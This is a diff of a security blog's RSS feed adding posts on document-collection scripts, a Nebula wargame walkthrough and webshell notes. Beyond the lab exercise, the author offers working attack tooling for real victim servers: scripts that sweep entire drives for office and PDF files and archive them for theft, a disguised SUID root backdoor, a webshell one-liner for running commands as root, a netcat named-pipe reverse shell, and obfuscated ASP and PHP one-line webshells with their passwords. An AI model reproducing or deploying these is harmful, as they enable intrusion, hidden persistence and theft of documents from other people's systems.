@@ -5,9 +5,331 @@
     <description>A blog about programming and network security</description>
     <link>/</link>
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Tue, 17 May 2016 17:33:28 +0800</pubDate>
-    <lastBuildDate>Tue, 17 May 2016 17:33:28 +0800</lastBuildDate>
+    <pubDate>Sat, 21 May 2016 14:03:04 +0800</pubDate>
+    <lastBuildDate>Sat, 21 May 2016 14:03:04 +0800</lastBuildDate>
     <generator>Jekyll v3.1.2</generator>
+    
+      <item>
+        <title>文件一键打包</title>
+        <description>&lt;h4 id=&quot;x01-linux&quot;&gt;0x01 linux&lt;/h4&gt;
+
+&lt;p&gt;linux打包命令：
+&lt;a href=&quot;http://pan.baidu.com/s/1nvcVqOT&quot;&gt;1.sh&lt;/a&gt; 密码：0y03&lt;br /&gt;
+(attention:without “&amp;amp;&amp;amp; echo ok”,the final tar -T xlsx.list -czf xlsx.tar.gz will fail)&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-----------------content of 1.sh--------------------
+mkdir /tmp/tmp &amp;amp;&amp;amp; find / -name &quot;*.doc&quot; &amp;gt; /tmp/tmp/doc.list &amp;amp;&amp;amp; find / -name &quot;*.docx&quot; &amp;gt; /tmp/tmp/docx.list &amp;amp;&amp;amp; find / -name &quot;*.pdf&quot; &amp;gt; /tmp/tmp/pdf.list &amp;amp;&amp;amp; find / -name &quot;*.txt&quot; &amp;gt; /tmp/tmp/txt.list &amp;amp;&amp;amp; find / -name &quot;*.xls&quot; &amp;gt; /tmp/tmp/xls.list &amp;amp;&amp;amp; find / -name &quot;*.xlsx&quot; &amp;gt; /tmp/tmp/xlsx.list &amp;amp;&amp;amp; tar -T /tmp/tmp/doc.list -czf /tmp/tmp/doc.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/docx.list -czf /tmp/tmp/docx.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/pdf.list -czf /tmp/tmp/pdf.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/txt.list -czf /tmp/tmp/txt.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xls.list -czf /tmp/tmp/xls.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xlsx.list -czf /tmp/tmp/xlsx.tar.gz &amp;amp;&amp;amp; echo ok
+--------------------end-----------------------------
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;x02-windows&quot;&gt;0x02 windows&lt;/h4&gt;
+
+&lt;p&gt;windows打包(7z)命令：
+&lt;a href=&quot;http://pan.baidu.com/s/1slMivlb&quot;&gt;1.bat&lt;/a&gt; 密码：3lwz&lt;br /&gt;
+(attention:7z.exe for x32 need a 7z.dll to performs well while 7z.exe for x64 needn’t)&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------------content of 1.bat--------------------------
+@echo off
+goto :main
+这是注释：(for /f &quot;delims=&quot;的作用为取消默认的以空格等符号作为分割符
+dir /s 实现了linux中的find功能，for /r path %%i in (web.conf?g) do ... 也可以实现find功能，但是自己实现时发现for /r path ...中的path只能是一个具体路径，不能是变量，这样就不能遍历全部磁盘了)
+:main
+set str=c d e f g h i j k l m n o p q r s t u v w x y z 
+rd /s/q c:\recycler\tmp
+md c:\recycler\tmp
+echo  当前硬盘的分区有： 
+for %%i in (%str%) do (
+if exist %%i: (echo %%i:
+
+for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\*.doc&quot;&#39;) do (
+echo &quot;yes&quot; | copy &quot;%%j&quot; c:\recycler\tmp
+echo %%j &amp;gt;&amp;gt; tmp.txt
+)
+
+for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\*.docx&quot;&#39;) do (
+echo &quot;yes&quot; | copy &quot;%%j&quot; c:\recycler\tmp
+echo %%j &amp;gt;&amp;gt; c:\recycler\tmp\tmp.txt
+)
+
+
+for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\*.pdf&quot;&#39;) do (
+echo &quot;yes&quot; | copy &quot;%%j&quot; c:\recycler\tmp
+echo %%j &amp;gt;&amp;gt; c:\recycler\tmp\tmp.txt
+)
+
+
+for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\*.txt&quot;&#39;) do (
+echo &quot;yes&quot; | copy &quot;%%j&quot; c:\recycler\tmp
+echo %%j &amp;gt;&amp;gt; c:\recycler\tmp\tmp.txt
+)
+
+
+for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\*.xls&quot;&#39;) do (
+echo &quot;yes&quot; | copy &quot;%%j&quot; c:\recycler\tmp
+echo %%j &amp;gt;&amp;gt; c:\recycler\tmp\tmp.txt
+)
+
+
+for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\*.xlsx&quot;&#39;) do (
+echo &quot;yes&quot; | copy &quot;%%j&quot; c:\recycler\tmp
+echo %%j &amp;gt;&amp;gt; c:\recycler\tmp\tmp.txt
+)
+
+
+)
+)
+
+7z a -t7z C:\recycler\tmp\test.7z C:\recycler\tmp\*.*
+------------------end--------------------------------
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+</description>
+        <pubDate>Fri, 20 May 2016 00:00:00 +0800</pubDate>
+        <link>/web/2016/05/20/%E6%96%87%E4%BB%B6%E4%B8%80%E9%94%AE%E6%89%93%E5%8C%85/</link>
+        <guid isPermaLink="true">/web/2016/05/20/%E6%96%87%E4%BB%B6%E4%B8%80%E9%94%AE%E6%89%93%E5%8C%85/</guid>
+        
+        <category>windows</category>
+        
+        <category>dir /s</category>
+        
+        <category>sh</category>
+        
+        <category>7z</category>
+        
+        <category>tar</category>
+        
+        
+        <category>web</category>
+        
+      </item>
+    
+      <item>
+        <title>nebula系统学习</title>
+        <description>&lt;h4 id=&quot;xff-about-nebula&quot;&gt;0xff About Nebula&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nebula takes the participant through a variety of common (and less than common) weaknesses and vulnerabilities in Linux. It takes a look at
+
+SUID files
+Permissions
+Race conditions
+Shell meta-variables
+$PATH weaknesses
+Scripting language weaknesses
+Binary compilation failures
+
+At the end of Nebula, the user will have a reasonably thorough understanding of local attacks against Linux systems, and a cursory look at some of the remote attacks that are possible.
+
+official website:   https://exploit-exercises.com/nebula/  
+some witeup:    https://lightless.me/archives/Nebula-writeup.html
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;x00-level00&quot;&gt;0x00 level00&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
+    su - level00
+    pass:level00
+    find / -type f -perm -4000 -ls &amp;gt; tmp.txt
+link knowledge:
+    linux中suid,sgid,sticky详解：http://crazyming.blog.51cto.com/1048571/467414
+    find / -type f -perm -4000 -ls &amp;gt; tmp.txt   function:find suid files
+        find / -type f -perm -4000 -ls | grep &quot;flag00&quot; &amp;gt; tmp.txt    function:find file has setuid=flag00
+    find / -type f -perm -2000 -ls &amp;gt; tmp.txt   function:find sgid files
+    find / -perm -2 -type f -print             function:find files can be writeable by everyone
+        echo &quot;/bin/cp /bin/sh /tmp/.sh;chmod 4755 /tmp/.sh&quot; &amp;gt;&amp;gt; writeable_file_if_it_is_from_any_autorun_directory
+        /tmp/.sh -p(this command to get a euid=root shell)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;x01-level01&quot;&gt;0x01 level01&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
+    su - level01
+    password:level01
+    PATH=/tmp:$PATH;export PATH;echo $PATH
+    vi /tmp/echo
+    -----content-----
+    /bin/sh
+    ------end--------
+    chmod +x /tmp/echo
+    cd /home/flag01
+    ./flag01
+    getflag
+
+link knowledge:
+    the source code of /home/flag01/flag01 is:
+
+    ------------content of source.c------------
+    #include &amp;lt;stdlib.h&amp;gt;
+    #include &amp;lt;unistd.h&amp;gt;
+    #include &amp;lt;string.h&amp;gt;
+    #include &amp;lt;sys/types.h&amp;gt;
+    #include &amp;lt;stdio.h&amp;gt;
+    
+    int main(int argc, char **argv, char **envp)
+    {
+      gid_t gid;
+      uid_t uid;
+      gid = getegid();
+      uid = geteuid();
+    
+      setresgid(gid, gid, gid);
+      setresuid(uid, uid, uid);
+    
+      system(&quot;/usr/bin/env echo and now what?&quot;);
+    }
+    ------------end----------------------------
+
+    when I trid to execute some commands as upon &quot;mykey&quot; do,but without its &quot;chmod +x /tmp/echo&quot;,I found it can not return a shell with suid=flag01 to execute /home/flag01/flag01,later I added chmod +x /tmp/echo,it succeeded.
+    ls -l /home/flag01 --&amp;gt;  -rwsr-x--- 1 flag01 level01 7322 2011-11-20 21:22 flag01
+
+    this means file flag01&#39;s owner is user flag01,belongs to group level01,but has setuid attribute,so when other user like level01 will get file flag01&#39;s owner(that is user flag01)&#39;s privilege
+
+    which getflag--&amp;gt;/bin/getflag
+    ls -l /bin/getflag--&amp;gt;  -rwxr-xr-x 1 root root 7311 2011-11-23 14:51 /bin/getflag
+
+    then execute upon &quot;mykey&quot; commands to pass level01,/bin/getflag is a program checks whether the user who execute /bin/getflag belongs to &quot;flag account&quot;,when a &quot;non-flag account&quot; like level01 trys to execute /bin/getflag,it returns:&quot;getflag is executing on a non-flag account,this doesn&#39;t count&quot;
+
+    however,when I first didn&#39;t add &quot;chmod +x /tmp/echo&quot; in &quot;mykey&quot;,I thought may be there exists some error in level01,and tried to change the source code of /home/flag01/flag01 to file.c:
+
+    -------------content of file.c----------
+    #include &amp;lt;stdlib.h&amp;gt;
+    #include &amp;lt;unistd.h&amp;gt;
+    #include &amp;lt;string.h&amp;gt;
+    #include &amp;lt;sys/types.h&amp;gt;
+    #include &amp;lt;stdio.h&amp;gt;
+    
+    int main(int argc, char **argv, char **envp)
+    {
+    	gid_t gid;
+    	uid_t uid;
+    	gid = getegid();
+    	uid = geteuid();
+    
+    	setresgid(gid, gid, gid);
+    	setresuid(uid, uid, uid);
+    
+    	system(&quot;/usr/bin/env echo &amp;amp;&amp;amp; echo runtime error.&quot;);
+    }
+    ------------end------------------------
+
+    that is change the final system sentence from &quot;system(&quot;/usr/bin/env echo and now what?&quot;);&quot; to &quot;system(&quot;/usr/bin/env echo &amp;amp;&amp;amp; echo runtime error.&quot;);&quot;,and this could be a &quot;works well backdoor&quot; when get a root shell in a system:
+    to use this file.c as a root shell backdoor after got a root shell,
+    use root role execute:
+        gcc -o 1 file.c
+        mv 1 /bin/l2ping
+        chmod 4755 /bin/l2ping(or in common user: sudo chown root /bin/l2ping;sudo chmod +s /bin/l2ping)
+    use webshell role execute:
+        PATH=/tmp:$PATH
+        export PATH
+        echo $PATH(to check if /tmp is in $PATH)
+        ln -s /bin/sh /tmp/echo
+        or:PATH=/tmp:$PATH;export PATH;echo $PATH;ln -s /bin/sh /tmp/echo
+        (later I found this will not get root shell,coz a new terminal shell created[/tmp/echo--&amp;gt;/bin/sh] by upon way will not display in webshells&#39; terminal)
+    then use webshell role to get a root privilege shell:
+        /bin/l2ping
+    
+    both source.c and file.c can be a root privilege backdoor shell,the difference between source.c and file.c is:
+    by source.c we should execute &quot;chmod +x /tmp/echo&quot;
+    by file.c we should execute &quot;ln -s /bin/sh /tmp/echo&quot;
+
+    *attention*:
+    when I tried to keep root privilege in webshell,and conveniently execute commands in webshell but with root privilege(so I don&#39;t have to use reGeorg and proxycap and putty and upon two kinds of backdoor to connect target victim pc and execute commands with root shell,these actions are too slow to control target server),I tried to use root privilege to execute:
+        chmod 4755 /..../..../webshell.php(eg.b374kshell)
+        browser visit--&amp;gt;http://xxx/xxx/xxx/webshell.php ---&amp;gt;  terminal:
+        id
+        out:auid=48(apache) gid=48(apache) groups=48(apache)
+    later I realized a webshell.php file with setuid=root will not execute as root privilege,coz only executable files like elf,*.sh files will execute as root privilege,*.php file is not in the scope,so my webshell&#39;s terminal will has apache&#39;s privilege,not root,I could chmod 4755 apache to get root privilege in webshell.php,but it&#39;s not wise.
+
+    !!!cool thing:   
+    one sentence to keep root shell in webshell(strong webshell better,like b374k,chopper may be stopped to execute a normal command when there exists some waf),use webshell&#39;s terminal function to execute:
+        PATH=/tmp:$PATH;export PATH;echo $PATH;/bin/echo &quot;whoami&quot; &amp;gt; /tmp/.out;rm /tmp/echo;ln -s /tmp/.out /tmp/echo;chmod +x /tmp/.out;/bin/l2ping &amp;gt; /tmp/.out1;cat /tmp/.out1;rm /tmp/.out1
+    this means with role apache&#39;s privilege to execute a program(a file with setuid=root),but it will has root privilege to execute commands,change &quot;whoami&quot; to any commond is ok to execute as root privilege.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;x02-level02&quot;&gt;0x02 level02&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
+    su - level02
+    pass:level02
+    USER=&quot;nihao;sh&quot;
+    ./flag02
+    getflag
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;x03-level03&quot;&gt;0x03 level03&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
+    su - level03
+    pass:level03(下文略去su - levelxx;pass:levelxx)
+    cd /home/flag03
+    vi writable.d/1.sh
+    ---------content------
+    (id;getflag) &amp;gt; /tmp/tmp.txt
+    ----------end---------
+    chmod +x writable/1.sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;x04-level04&quot;&gt;0x04 level04&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
+    cd /home/flag04
+    ln -s /home/flag04/token /tmp/level04
+    ./flag04 /tmp/level04
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;x05-level05&quot;&gt;0x05 level05&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
+    cd /home/flag05
+    ls -la
+    cp ./backup/* /home/level05
+    cd /home/level05
+    tar zxvf backup[tab]
+    ls -la(then found .ssh directory created in common directory&amp;lt;/home/level05&amp;gt;)
+    ssh flag05@127.0.0.1
+    yes
+    getflag
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;x06-level06&quot;&gt;0x06 level06&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
+    vi /etc/passwd
+    v--&amp;gt; flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh --&amp;gt; :&amp;lt;,&amp;gt;w pass.txt
+    use kali2&#39;s john
+    john pass.txt
+    get flag06:hello
+    su - flag06
+    pass:hello
+    getflag #### 0x07 level07
+mykey:
+    ctr+alt+f2 --&amp;gt; tty2
+    tty2:nc -lnv 8888
+    ctr+alt+f1(backto tty1)
+    tty1:wget -O- &quot;http://127.0.0.1:7007/index.cgi?Host=127.0.0 || mknod /tmp/backpipe p &amp;amp;&amp;amp; /bin/sh 0&amp;lt;/tmp/backpipe | nc 127.0.0.1 8888 1&amp;gt;/tmp/backpipe&quot;
+    ctr+alt+f2 --&amp;gt; tty2
+    tty2:id(flag07),getflag
+link knowledge:
+    for security,the linux system may not support -e parameter in netcat(nc -e ip port),so one way to exploit is:
+        mknod /tmp/backpipe p
+        /bin/bash 0&amp;lt;/tmp/backpipe | nc 127.0.0.1 8888 1&amp;gt;/tmp/backpipe
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+</description>
+        <pubDate>Thu, 19 May 2016 00:00:00 +0800</pubDate>
+        <link>/linux/2016/05/19/nebula/</link>
+        <guid isPermaLink="true">/linux/2016/05/19/nebula/</guid>
+        
+        <category>privilege escalation</category>
+        
+        <category>linux</category>
+        
+        
+        <category>linux</category>
+        
+      </item>
     
       <item>
         <title>windows 2008 domain controllers</title>
@@ -1619,7 +1941,7 @@ input your number here:&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&
     先通过一些数据链路连接到vpn，然后vpn作为代理再访问互联网。
 &lt;span class=&quot;p&quot;&gt;11.&lt;/span&gt;tar - T mulu.list - czf file.tar.gz
 &lt;span class=&quot;p&quot;&gt;12.&lt;/span&gt;分割大文件再合并
-    split - b 20m RevolutionOS.rmvb RevOS_part_,
+    split -b 20m RevolutionOS.rmvb RevOS_part_,
     cat RevOS_part_ &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &amp;gt; RevolutionOS_RSB.rmvb,
     md5sum RevolutionOS.rmvb(md5sum RevolutionOS_RSB.rmvb)
 &lt;span class=&quot;p&quot;&gt;13.&lt;/span&gt;一些数据库操作
@@ -1708,6 +2030,20 @@ input your number here:&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&
             webacoo
             weevely
    asp:
+   &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%execute(unescape(&quot;eval%20request%28%222016%22%29&quot;))%&amp;gt;          key:2016
+
+   &amp;lt;%
+   dim a,b,temp,c
+   a=&quot;eva@@l%20req@@uest%28%22helloxj%22%29&quot;
+   b=replace(a,&quot;@@&quot;,&quot;零&quot;)
+   c=split(b,&quot;零&quot;)
+   for i=0 to ubound(c)
+   temp=temp+c(i)
+   next
+   execute(unescape(temp))
+   %&amp;gt;
+                        key:helloxj
+
    &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%Y=request(&quot;shezhang&quot;)%&amp;gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%execute(Y)%&amp;gt;
     
    &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%eval(eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(&quot;shezhang&quot;))%&amp;gt;
@@ -1715,6 +2051,8 @@ input your number here:&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&
    &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%eval&quot;&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;(&quot;e&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;v&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;a&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;l&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;(&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;r&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;e&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;q&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;u&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;e&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;s&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;t&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;(&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;0&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;-&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;2&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;-&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;5&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;)&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;)&quot;)%&amp;gt;（密码是-7）
 
    php:
+   &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php $a = base64_decode(Y.X.N.z.Z.X.J01);$a($_POST[g]);?&amp;gt;&lt;/span&gt;       key:g
+   &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php $x_x=base64_decode(Y.X.N.z.Z.X.J01);$x_x(($_POST[$_GET[a]]));?&amp;gt;&lt;/span&gt;        key:the value of &quot;a&quot;
    &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php$a=str_replace(x,&quot;&quot;,&quot;axsxxsxexrxxt&quot;);$a($_POST[&quot;shezhang&quot;]);?&amp;gt;&lt;/span&gt;
     
    &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php$lang=(string)key($_POST);$lang($_POST[&#39;shezhang&#39;]);?&amp;gt;&lt;/span&gt;
@@ -1773,6 +2111,8 @@ input your number here:&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;language=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;C#&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;runat=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;server&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;      
    WebAdmin2Y.x.yaaaaa=newWebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;);      
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;                              密码是webadmin
+
+   aspx隐藏一句话新：http://z-cg.com/?mod=pad&lt;span class=&quot;ni&quot;&gt;&amp;amp;act=view&amp;amp;id=10(&amp;lt;%WebServices.ShowRunnerVersion();&lt;/span&gt;%&amp;gt;,&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%WebServices.InitializeWebServices(&quot;fuck&quot;);%&amp;gt;)
 &lt;span class=&quot;p&quot;&gt;31.&lt;/span&gt;windows local privileges:http://www.52wa.net/post-198.html
                             http://le4f.net/post/post/windows-x64-local-privilege-escalation
                             https://forum.90sec.org/forum.php?mod=viewthread&amp;amp;tid=9067#lastpost
@@ -1862,19 +2202,94 @@ input your number here:&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&
    find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.doc&quot; &amp;gt; doc.list;find . -name &quot;*&lt;/span&gt;.docx&quot; &amp;gt; docx.list;find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.pdf&quot; &amp;gt; pdf.list;find . -name &quot;*&lt;/span&gt;.txt&quot; &amp;gt; txt.list;find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.xls&quot; &amp;gt; xls.list;find . -name &quot;*&lt;/span&gt;.xlsx&quot; &amp;gt; xlsx.list;find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.jpg&quot; &amp;gt; jpg.list;find . -name &quot;*&lt;/span&gt;.png&quot; &amp;gt; png.list
    tar -czf code.tar.gz &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;;tar -T doc.list -czf doc.tar.gz;tar -T docx.list -czf docx.tar.gz;tar -T pdf.list -czf pdf.tar.gz;tar -T txt.list -czf txt.tar.gz;tar -T xls.list -czf xls.tar.gz;tar -T xlsx.list -czf xlsx.tar.gz;tar -T jpg.list -czf jpg.tar.gz;tar -T png.list -czf png.tar.gz
 
-   simple version:(without txt..)
-   find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.doc&quot; &amp;gt; doc.list;find . -name &quot;*&lt;/span&gt;.docx&quot; &amp;gt; docx.list;find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.pdf&quot; &amp;gt; pdf.list;find . -name &quot;*&lt;/span&gt;.xls&quot; &amp;gt; xls.list;find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.xlsx&quot; &amp;gt; xlsx.list;tar -czf code.tar.gz *&lt;/span&gt;;tar -T doc.list -czf doc.tar.gz;tar -T docx.list -czf docx.tar.gz;tar -T pdf.list -czf pdf.tar.gz;tar -T xls.list -czf xls.tar.gz;tar -T xlsx.list -czf xlsx.tar.gz
+   recently I found command1;command2 performs not good to search all files in webshell&#39;s upon commonds,better to execute comman1 &amp;amp;&amp;amp; command2 if comman1 and command2 cost not few seconds,but a lot seconds to finish executing:
 
-   windows:
-   find /r 目录名 %变量名 in (匹配模式1,匹配模式2) do 命令  eg:echo &quot;yes&quot; | for /r f:&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;%i in (&lt;span class=&quot;ge&quot;&gt;*.doc,*&lt;/span&gt;.docx,&lt;span class=&quot;ge&quot;&gt;*.pdf,*&lt;/span&gt;.xls,&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;.xlsx) do copy %i f:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;eb_r
+   find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.doc&quot; &amp;gt; doc.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.docx&quot; &amp;gt; docx.list &amp;amp;&amp;amp; find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.pdf&quot; &amp;gt; pdf.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.txt&quot; &amp;gt; txt.list &amp;amp;&amp;amp; find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.xls&quot; &amp;gt; xls.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.xlsx&quot; &amp;gt; xlsx.list
+   tar -T doc.list -czf doc.tar.gz &amp;amp;&amp;amp; tar -T docx.list -czf docx.tar.gz &amp;amp;&amp;amp; tar -T pdf.list -czf pdf.tar.gz &amp;amp;&amp;amp; tar -T txt.list -czf txt.tar.gz &amp;amp;&amp;amp; tar -T xls.list -czf xls.tar.gz &amp;amp;&amp;amp; tar -T xlsx.list -czf xlsx.tar.gz
+
+   or:
+   mkdir /tmp/tmp
+   PATH=/tmp:$PATH;export PATH;echo $PATH;/bin/echo &#39;&#39;&#39;find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.doc&quot; &amp;gt; /tmp/tmp/doc.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.docx&quot; &amp;gt; /tmp/tmp/docx.list &amp;amp;&amp;amp; find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.pdf&quot; &amp;gt; /tmp/tmp/pdf.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.txt&quot; &amp;gt; /tmp/tmp/txt.list &amp;amp;&amp;amp; find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.xls&quot; &amp;gt; /tmp/tmp/xls.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.xlsx&quot; &amp;gt; /tmp/tmp/xlsx.list&#39;&#39;&#39; &amp;gt; /tmp/.out;rm /tmp/echo;ln -s /tmp/.out /tmp/echo;chmod +x /tmp/.out;/bin/l2ping &amp;gt; /tmp/.out1;cat /tmp/.out1;rm /tmp/.out1
+   tar -T /tmp/tmp/doc.list -czf /tmp/tmp/doc.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/docx.list -czf /tmp/tmp/docx.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/pdf.list -czf /tmp/tmp/pdf.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/txt.list -czf /tmp/tmp/txt.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xls.list -czf /tmp/tmp/xls.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xlsx.list -czf /tmp/tmp/xlsx.tar.gz
+
+   sometimes when try to execute in this way:
+   PATH=/tmp:$PATH;export PATH;echo $PATH;/bin/echo &#39;&#39;&#39;find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.doc&quot; &amp;gt; /tmp/tmp/doc.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.docx&quot; &amp;gt; /tmp/tmp/docx.list &amp;amp;&amp;amp; find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.pdf&quot; &amp;gt; /tmp/tmp/pdf.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.txt&quot; &amp;gt; /tmp/tmp/txt.list &amp;amp;&amp;amp; find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.xls&quot; &amp;gt; /tmp/tmp/xls.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.xlsx&quot; &amp;gt; /tmp/tmp/xlsx.list&#39;&#39;&#39; &amp;gt; /tmp/.out;rm /tmp/echo;ln -s /tmp/.out /tmp/echo;chmod +x /tmp/.out;/bin/l2ping &amp;gt; /tmp/.out1;cat /tmp/.out1;rm /tmp/.out1
+
+   may found it didn&#39;t succeed to create list file except for doc.list,then try useing normal webshell&#39;s terminal to execute the one without root privilege in one of upon ways&lt;span class=&quot;sb&quot;&gt;
+
+
+&lt;/span&gt;   windows:
